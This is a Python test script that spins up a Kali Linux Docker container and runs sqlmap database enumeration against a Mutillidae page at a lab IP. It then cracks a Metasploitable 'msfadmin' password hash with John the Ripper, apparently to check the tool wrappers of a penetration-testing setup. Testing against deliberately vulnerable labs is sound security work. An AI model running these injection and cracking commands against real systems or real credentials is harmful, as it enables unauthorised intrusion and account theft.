import asyncio
import docker

async def test_sqlmap():
    target_ip = "172.17.0.2"
    print(f"[*] Target IP: {target_ip}")
    print("[*] Initializing Docker Manager...")
    client = docker.from_env()
    
    print("[*] Starting temporary container for sqlmap testing...")
    test_container = client.containers.run(
        "kalilinux/kali-rolling",
        command="sleep infinity",
        detach=True,
        remove=True
    )
    
    print("[*] Installing sqlmap and john...")
    test_container.exec_run("apt-get update -qq")
    test_container.exec_run("apt-get install -y -qq sqlmap john")
    
    # SQLMap Test
    print("\n--- Testing sqlmap_run (basic scan) ---")
    target_url = f"http://{target_ip}/mutillidae/index.php?page=user-info.php&username=a&password=a&user-info-php-submit-button=View+Account+Details"
    
    res = test_container.exec_run(f"sqlmap -u '{target_url}' --batch --dbs")
    out = res.output.decode('utf-8', errors='replace')
    print(out[:1000] + "\n[Output truncated]")
    
    if "available databases" in out.lower() or "mutillidae" in out.lower() or "dvwa" in out.lower():
        print("[+] SQLMap successfully found databases!")
    else:
        print("[-] SQLMap did not find the databases.")
        
    # John the Ripper Test
    print("\n--- Testing crack_john ---")
    # Write hash to file inside container
    test_container.exec_run(["bash", "-c", "echo 'msfadmin:$1$O3J2.Q2x$yIq/.22E3tO2r5.w2r/B.1' > /tmp/hash.txt"])
    
    # Run john
    res = test_container.exec_run("john /tmp/hash.txt")
    out = res.output.decode('utf-8', errors='replace')
    print(out)
    
    res = test_container.exec_run("john --show /tmp/hash.txt")
    out = res.output.decode('utf-8', errors='replace')
    print(out)
    
    if "msfadmin" in out:
        print("[+] John successfully cracked the hash!")
    else:
        print("[-] John failed to crack the hash.")
        
    print("[*] Tearing down temporary container...")
    test_container.stop()

if __name__ == "__main__":
    asyncio.run(test_sqlmap())
